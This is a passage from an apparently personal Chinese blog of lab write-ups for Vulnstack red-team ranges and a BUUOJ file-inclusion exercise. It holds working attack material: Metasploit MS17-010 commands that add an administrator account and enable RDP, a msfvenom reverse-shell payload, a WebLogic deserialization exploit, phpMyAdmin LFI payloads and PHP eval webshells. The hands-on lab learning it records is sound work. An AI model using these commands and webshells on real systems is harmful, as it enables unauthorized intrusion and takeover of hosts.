title="10.内网端口扫描"></a>10.内网端口扫描</h4><p>由上面的代理服务就能直接使用nmap来扫描了，开始我用的是msf自带的扫描模块，<em>但是速度远远不如nmap感觉，还是nmap用着舒服</em>我收回斜体的这些话，可能是我不会用nmap，还没msf自带的快</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -Pn -sT -F -T4 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Nmap scan report for 192.168.52.138Host is up (4.0s latency).Not shown: 90 closed portsPORT      STATE SERVICE53&#x2F;tcp    open  domain80&#x2F;tcp    open  http88&#x2F;tcp    open  kerberos-sec135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn389&#x2F;tcp   open  ldap445&#x2F;tcp   open  microsoft-ds49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -Pn -sT -F -T4 192.168.52.141<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Nmap scan report for 192.168.52.141Host is up (1.1s latency).Not shown: 95 closed portsPORT     STATE SERVICE21&#x2F;tcp   open  ftp135&#x2F;tcp  open  msrpc139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds1025&#x2F;tcp open  NFS-or-IIS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只对<code>--top-ports 100</code>进行扫描，扫描结果分别粘贴在了上面。</p><p>注意到上面得两个主机都开了<code>445号端口</code>，了解到445号端口是Windows进行SMB通信得端口，是存在漏洞的，并且msf中也有相应的扫描的模块<code>auxiliary/admin/smb/ms17_010_command</code></p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 192.168.52.141set command net user m4xlmum @dmin121 &#x2F;add #添加用户run #成功执行set command net localgroup administrators m4xlmum &#x2F;add #管理员权限run #成功执行set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;run #成功执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后连接远程桌面<code>proxychains rdesktop 192.168.52.141</code>，</p><pre class="line-numbers language-none"><code class="language-none">username:m4xlmumpassword:@dmin121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605233517509.png" alt></p><p>但是刚才我新建的那个用户是不能连接到<code>GOD域网络</code>的，只能连141号，这一个主机</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605233627848.png" alt></p><p>再在141号机子上开一个后门程序。<strong>没开成功</strong></p><pre class="line-numbers language-none"><code class="language-none">没成功这里也没必要填了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="五、域控"><a href="#五、域控" class="headerlink" title="五、域控"></a>五、域控</h3><h4 id="11-ms17-010再利用"><a href="#11-ms17-010再利用" class="headerlink" title="11.ms17-010再利用"></a>11.ms17-010再利用</h4><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE53&#x2F;tcp    open  domain80&#x2F;tcp    open  http88&#x2F;tcp    open  kerberos-sec135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn389&#x2F;tcp   open  ldap445&#x2F;tcp   open  microsoft-ds49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接试试用445端口的那个再打一下</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 192.168.52.138set command net user m4xlmum @dmin121 &#x2F;addrunset command net localgroup administrators m4xlmum &#x2F;add runset command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不行，好累，放弃了至此。</p><p>第一个没拿到域控，应该还是没经验会的少，下周再继续学。</p><h2 id="红日安全靶场-1"><a href="#红日安全靶场-1" class="headerlink" title="红日安全靶场"></a>红日安全靶场<02 att&ck红队评估></02></h2><pre class="line-numbers language-none"><code class="language-none">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX1. Bypass UAC2. Windows系统NTLM获取（理论知识：Windows认证）3. Access Token利用（MSSQL利用）4. WMI利用5. 网页代理，二层代理，特殊协议代理（DNS，ICMP）6. 域内信息收集7. 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用8. 域凭证收集9. 后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）****环境说明****内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：deny all tcp ports：10.10.10.1allow all tcp ports：10.10.10.0&#x2F;24****配置信息******DC**IP：10.10.10.10OS：Windows 2012(64)应用：AD域**WEB**IP1：10.10.10.80IP2：192.168.111.80OS：Windows 2008(64)应用：Weblogic 10.3.6MSSQL 2008**PC**IP1：10.10.10.201IP2：192.168.111.201OS：Windows 7(32)应用：**攻击机**IP：192.168.111.1OS：Windows 10(64)IP：192.168.111.11OS：Parrot(64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络拓补图</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210606112119602.png" alt></p><h3 id="一、环境搭建-1"><a href="#一、环境搭建-1" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="关于web主机用户名密码错误"><a href="#关于web主机用户名密码错误" class="headerlink" title="关于web主机用户名密码错误"></a>关于web主机用户名密码错误</h4><p>这个应该是靶场的问题，毕竟用爱发电，哪里有点做的不好也非常可以理解，还是可以玩一玩的。</p><ol><li>先将win server 2008虚拟机恢复快照到最新的那个，应该是最上面那个<code>V1.3 10月21号</code>的那个。</li><li>重新启动了之后直接登录<code>WEB\de1ay    1qaz@WSX</code>会提示让修改密码，修改密码为<code>@dmin123</code>即可。</li></ol><h4 id="关于这次环境网卡的配置"><a href="#关于这次环境网卡的配置" class="headerlink" title="关于这次环境网卡的配置"></a>关于这次环境网卡的配置</h4><p> 这次主要是修改了虚拟机内部的网络设置，外部的与上一个还是差不太多的。</p><p>先说一下这次的外、内网的ip分配</p><div class="table-container"><table><thead><tr><th>主机</th><th>ip</th></tr></thead><tbody><tr><td>PC、DC、WEB</td><td>都有内网的ip(10.10.10.0)</td></tr><tr><td>攻击机、PC、WEB</td><td>都有外网的ip(192.168.10.0)</td></tr></tbody></table></div><p>并且这次的外网ip分配成了，VMware的NAT模式，一般来说是应该可以连通外网的，上几张图。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607002210409.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210606213750392.png" alt="VMWare设置"></p><p>这里我各个机器的ip地址分配如下</p><div class="table-container"><table><thead><tr><th>主机</th><th>内网IP</th><th>外网IP</th></tr></thead><tbody><tr><td>WEB</td><td>10.10.10.80</td><td>192.168.10.132</td></tr><tr><td>PC</td><td>10.10.10.201</td><td>192.168.10.133</td></tr><tr><td>DC</td><td>10.10.10.10</td><td>无</td></tr><tr><td>kali攻击机</td><td>无</td><td>192.168.10.129</td></tr></tbody></table></div><p>然后还有WEB虚拟机、PC虚拟机，内部的模拟外网ip，要调成自动分配ip。挺简单的就不截图了这个。</p><p>再然后要注意的就是那个靶场说明里边的weblogic漏洞利用，我的一开始那个weblogic是没有启动成功的，原因就是你需要登录的是管理员的账号</p><p><a href="https://jingyan.baidu.com/article/ad310e80d1a6e21849f49e9c.html">WebLogic出现没启动的特殊情况参考这篇文章</a></p><pre class="line-numbers language-none"><code class="language-none">de1ay\administrator1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然如果你登陆的不是管理员账号也没什么关系，把下面的这个右键以管理员权限身份运行即可</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607004118696.png" alt></p><p>但是会出现像我这里出现的这种大黑框，但是毕竟我们不需要直接在这台WEB主机上进行什么操作，所以我就直接以管理员身份运行了。再去kali里面扫一下端口开放情况。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607004946587.png" alt="这守再是扫描会发现7001端口已经上线了"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>先来第一波信息收集，这里主要针对WEB主机进行扫描</p><p>端口开放情况</p><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE80&#x2F;tcp    open  http135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds1433&#x2F;tcp  open  ms-sql-s3389&#x2F;tcp  open  ms-wbt-server7001&#x2F;tcp  open  afs3-callback49152&#x2F;tcp open  unknown49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49156&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我改一下上一篇总结的格式，分开三台主机(WEB主机、PC主机、DC主机)这样写。</p><h3 id="三、拿下WEB主机"><a href="#三、拿下WEB主机" class="headerlink" title="三、拿下WEB主机"></a>三、拿下WEB主机</h3><h4 id="主要目标"><a href="#主要目标" class="headerlink" title="主要目标"></a>主要目标</h4><p><strong>这里主要目标有三个：1.拿到WEB主机地后门、2.拿到WEB主机内部的密码、3.让WEB主机作为进入内网的跳板</strong></p><h4 id="1-WebLogic漏洞利用"><a href="#1-WebLogic漏洞利用" class="headerlink" title="1.WebLogic漏洞利用"></a>1.WebLogic漏洞利用</h4><blockquote><p>weblogic是什么？ WebLogic是美国bea公司出品的一个<strong>application server</strong>确切的说是一个基于j2ee架构的中间件，webserver是用来构建网站的必要软件用来解析发布网页等功能，它是用纯java开发的。 weblogic本来不是由bea发明的，是它从别人手中买过来，然后再加工扩展。 目前weblogic在世界application server市场上占有最大的份额，其他还有象IBM的websphere，免费的tomcat、resin等中间件。 BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p></blockquote><p><strong>这里使用的工具是WebLogic Scan</strong></p><p><a href="https://gitee.com/omg2019/WeblogicScan-1?_from=gitee_search">weblogic-scan下载地址gitee</a></p><p>GitHub有点慢，直接用gitee上面的应该也是可以的，下载后解压到kali里面</p><p>我的直接就能使用了，没下载<code>requiremens.txt</code>如果出现运行失败请自行下载。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210607011653673.png" alt></p><p>扫出来的漏洞如上图所示，这里一个一个验证知道可以上传后门程序为止。</p><p>首先是后台路径的问题，这里是一个简单的没有验证码的后台登陆，但是使用了两个弱口令就没再试了，毕竟是弱口令进去还要再进行攻击，下面的这几个应该可以直接进行攻击。</p><p>下面的SSRF利用起来也是有点复杂的，这里使用<code>Weblogic反序列化漏洞(CVE-2019-2725)</code>来进行攻击，上传木马。</p><p><a href="https://www.cnblogs.com/twlr/p/13027190.html">参考这篇文章</a>，但是即使如此还是特别麻烦，这里选择使用师傅的工具。</p><p><a href="https://kfi.re/220.html">工具下载</a>、<a href="https://www.cnblogs.com/sstfy/p/10350915.html">工具使用</a></p><p><strong>这个工具使用的java的版本网上说的不太详细，使用了11与16与8都失败了，暂时放弃</strong></p><p><a href="https://www.anquanke.com/post/id/242566">使用exploit-db的利用脚本解决，参考的是这篇文章</a></p><ol><li>首先生成一个反弹shell的powershell脚本，使用以下命令，使用工具为msfvenom</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.10.129 LPORT&#x3D;4444 -f psh-cmd &gt; reverse.ps1# 这个IP地址是你攻击机的ip，端口随意设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614224550563.png" alt></p><ol><li><a href="https://www.exploit-db.com/exploits/46780">下载Exploit</a>，并且将里面的exploit的内容替换为生成的payload</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614225036115.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210614225155048.png" alt></p><ol><li>使用MSF设置监听，然后使用下面的</li></ol><pre class="line-numbers language-none"><code class="language-none">python exploit.py http:&#x2F;&#x2F;IP:PORT&#x2F;_async&#x2F;AsyncResponseServiceHttps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210615004348045.png" alt></p><p>这里我就先不纠结了，直接允许算了，他们都说用上面的那个终极反序列化利用工具能过360，但是终究是我的Java环境不行，这里当一次物理黑客，直接退出360(真的把我搞得没辙了，可见360还是有一些用的嘤嘤嘤)。本来呢，360没法过的话是绝对进不了Web服务器的，看来有空是时候要学点免杀的技巧了。</p><p><strong>再次宕机，过一年再回头看，最近一年都不会再搞这套靶机了，能力暂时不支持</strong></p><h2 id="红日安全靶场-2"><a href="#红日安全靶场-2" class="headerlink" title="红日安全靶场"></a>红日安全靶场<03 att&ck红队评估></03></h2><h3 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h3><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/"><strong>ATT&amp;CK3地址</strong></a></p><pre class="line-numbers language-none"><code class="language-none">基本信息作者：licong环境配置打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。挂起状态，账号已默认登陆，centos为出网机，第一次运行，需重新获取桥接模式网卡ip。除重新获取ip，不建议进行任何虚拟机操作。参考虚拟机网络配置，添加新的网络，该网络作为内部网络。注：名称及网段必须符合上述图片，进行了固定ip配置。描述目标：域控中存在一份重要文件。本次环境为黑盒测试，不提供虚拟机账号密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这套环境的主机又太多了，我的电脑带起来实在是很吃力，往后这种主机较多的靶机估计是打不了了，只能打打主机不超过三台的小环境了，当然根据少就是多的原则，一定会将小环境利用到极致的。</p><h2 id="红日安全靶场-3"><a href="#红日安全靶场-3" class="headerlink" title="红日安全靶场"></a>红日安全靶场<04 att&ck红队评估></04></h2><h3 id="一、环境介绍"><a href="#一、环境介绍" class="headerlink" title="一、环境介绍"></a>一、环境介绍</h3><pre class="line-numbers language-none"><code class="language-none">大家好红日安全红队靶场（四）已经出来，本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞，希望大家多多利用。红队评估四靶场描述第一次搭建靶机，如有啥不足或问题，欢迎各位师傅在vlunstack微信群里提出，向师傅们学习其它靶场下载地址    红队评估一：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;    红队评估二：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F;    红队评估三：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;5&#x2F;    Web安全靶场下载：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;4&#x2F;靶场学习路径，可参考    st漏洞利用    phpmyadmin getshell    tomcat 漏洞利用    docker逃逸    ms14-068    ssh密钥利用    流量转发    历史命令信息泄露    域渗透环境说明机器密码    ubuntu:ubuntu    域成员机器:    douser:Dotest123    DC:    administrator:Test2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次的环境感觉挺少的，可以打一打试一试的。</p><p>值得一提的是域控DC主机的密码是需要改一下的，我将域控主机的密码改为了<code>admin@123</code>。</p><h3 id="二、网络配置"><a href="#二、网络配置" class="headerlink" title="二、网络配置"></a>二、网络配置</h3><p>除了第一、二个靶机好像后面的都没有再放出来网络拓补图了，但是我已经会配了嘿嘿，已经不需要了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621224734999.png" alt></p><p>内网网络的IP地址段为<code>10.10.10.0/24</code>。</p><p>外网模拟的网段为<code>192.168.10.0/24</code>。</p><pre class="line-numbers language-none"><code class="language-none">攻击机(kali)        :  192.168.10.128(外网)受害机(ubuntu)      :  192.168.10.136(外网)、10.10.10.132(内网)域控DC(Server 2008) :  10.10.10.133(内网)Windows 7   :  10.10.10.130(内网)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>域控机的ipv4方案要调成自动获取ip才可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622105055779.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621230506323.png" alt></p><p>能实现Ubuntu可以ping通Kali即可。</p><p>但是我们重启ubuntu之后所有的docker服务似乎都下线了，这就需要我们再重启一下了，这里因为我没记开始的服务所用到的端口，索性每次就开一个web服务，一个一个地去getshell。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622120132257.png" alt></p><h3 id="三、phpmyadmin-getshell"><a href="#三、phpmyadmin-getshell" class="headerlink" title="三、phpmyadmin getshell"></a>三、phpmyadmin getshell</h3><p>参考靶机服务的命名，用的就是这个洞<code>CVE-2018-12613</code>。</p><p>各个环境的版本信息</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622120439658.png" alt></p><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>phpmyadmin版本4.8.0、4.8.1</li><li>必须能进入phpmyadmin，也就是说要有用户名与密码。</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>查看能不能实现include</p><pre class="line-numbers language-none"><code class="language-none">payload：http:&#x2F;&#x2F;192.168.10.136:2003&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622123420161.png" alt></p><pre class="line-numbers language-none"><code class="language-none">SELECT &quot;&lt;?php phpinfo();?&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后有这个的话就简单了，直接先在sql查询的那里面执行一下上面的语句，执行之前看看自己的cookie，phpmyadmin对应的值就是php的session文件的文件名，回头直接包含这个恶意session文件即可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622124039589.png" alt></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210622124423732.png" alt></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>getshell也简单了，做个蚁剑的马。</p><pre class="line-numbers language-none"><code class="language-none">SELECT &quot;&lt;?php highlight_file(__FILE__); @eval($_POST[&#39;c&#39;]);?&gt;&quot;;SELECT &#96;&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>暂时遇到点问题，不打了先。</p><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="Webug-4-0"><a href="#Webug-4-0" class="headerlink" title="Webug 4.0"></a>Webug 4.0</h2><h3 id="零、环境介绍"><a href="#零、环境介绍" class="headerlink" title="零、环境介绍"></a>零、环境介绍</h3><h1 id="BUUOJ——Basic"><a href="#BUUOJ——Basic" class="headerlink" title="BUUOJ——Basic"></a>BUUOJ——Basic</h1><h2 id="一、BUU-LFI-COURSE-1"><a href="#一、BUU-LFI-COURSE-1" class="headerlink" title="一、BUU LFI COURSE 1"></a>一、BUU LFI COURSE 1</h2><p><strong>什么是php的LFI</strong></p><blockquote><p>首先谈到lfi就要先知道常见的文件包含所需要有的函数，下面是一些常见的(<strong>注意:LFI是php所特有的应该是，就目前所学来看</strong>)</p><ol><li><p>include()                 //包含一些html模块文件</p></li><li><p>require()                 //包含一些数据库,配置文件</p></li><li><p>include_once()       //只调用一次包含文件,多次调用就会报错</p></li><li><p>require_once()</p></li></ol><p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，<strong>也都将作为PHP代码执行</strong>。</p><p><strong>include与require的区别在于:</strong></p><ol><li><p>include是当代码执行到它所在的行数是,它才会开始包含文件,并且如果文件加载错误,依然会向下执行代码。</p></li><li><p>require是只要当前程序执行它就会立刻包含文件,并且在加载文件错误的时候会停止运行并发出警告。</p></li></ol></blockquote><p>然后就是甚么是LFI了，刚开始打CTF的时候看到wp中所写的lfi，还是有点不知所然的。但是了解了一下知道原来就是简单的文件包含而已。。</p><blockquote><p><strong>文件包含漏洞的类型分为:</strong></p><ol><li>本地文件包含(LFI)</li><li>远程文件包含(RFI)</li></ol><p>当<strong>php.ini</strong>中，设置</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">></span>allow_url_include <span class="token operator">=</span> On<span class="token operator">></span>allow_url_fopen <span class="token operator">=</span> On<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即可<strong>执行远程代码</strong>。</p></blockquote><p>然后就是说到这个本地文件包含了，这个在真实的渗透测试(黑盒)的过程中通常是十分难以发现的，因为条件十分的苛刻。首先后端的整体框架是要使用php的，然后又要判断到底是哪里可能是由文件包含常用的那几个函数，而且最重要的是，这个函数的参数对于我们来说必须是可控的，而这对于黑盒测试简直就是不可能的，所以一般使用LFI的时候面向的测试对象一般是需要白盒的。也就是LFI一般是白盒代码审计的时候会见得到，其他情况下是很少见的。</p><p>下面是zhao老师给出的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码的意思就是获得一个文件并且包含这个文件。这里的<code>$str</code>变量看似并没有使用上。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621140837246.png" alt></p><p>这里因为会将里面包含的文件的内容当成html文件，所以我们包含flag文件的时候应该是直接可以输出flag的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621140948098.png" alt></p><p>当然获得flag并不是我们渗透测试的主要目的，这种最多算是个任意问价读取，还是要看看如何getshell。这里采取包含日志文件，在日志文件里面请求头里面插入恶意代码。</p><p>这里针对nginx这种专门的中间件可以包含下面的文件来getshell</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;包含日志文件&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621141916984.png" alt></p><p><strong>值得一提的是这里包含的access.log文件并不会包含到post的内容，只会包含请求的资源以及UA头。但是这对于我们getshell已经是够得不能再够了。</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621141735484.png" alt></p><p>可以看到浏览器自动高亮了，也就是说这里已经是可以执行了的。直接连上蚁剑获得该终端。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621142213571.png" alt></p><p>本来上线之后第一件事就是想着要练练提权的，但是一看啥环境都没有，直接放弃了。</p><pre class="line-numbers language-none"><code class="language-none">(www-data:&#x2F;tmp) $ ls &#x2F;binarchashbase64bbconfigbusyboxcatchgrpchmodchownconspycpdatedddfdmesgdnsdomainnamedumpkmapechoedegrepfalsefatattrfdflushfgrepfsyncgetoptgrepgunzipgziphostnameioniceiostatipcalckbd_modekilllinklinux32linux64lnloginlslzopmakemimemkdirmknodmktempmoremountmountpointmpstatmvnetstatnicepidofpingping6pipe_progressprintenvpspwdreformimerevrmrmdirrun-partssedsetprivsetserialshsleepstatsttysusynctartouchtrueumountunameusleepwatchzcat<span aria-hidden="true" 